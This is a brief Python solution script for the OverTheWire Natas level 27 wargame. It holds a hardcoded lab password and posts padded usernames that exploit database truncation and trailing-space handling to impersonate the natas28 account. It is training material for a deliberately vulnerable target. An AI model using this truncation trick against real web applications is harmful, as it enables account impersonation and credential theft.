#!/usr/bin/python3
# Time: 2019/04/23 10:23 PM


import requests
import base64
import codecs


username = 'natas27'
password = '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'
url = f'http://{username}.natas.labs.overthewire.org/'

s = requests.Session()


resp = s.post(url, auth=(username, password), data={"username": "natas28" + " "*58 + "anything", "password": "anything"})
resp = s.post(url, auth=(username, password), data={"username": "natas28  ", "password": "anything"})
print(resp.text)

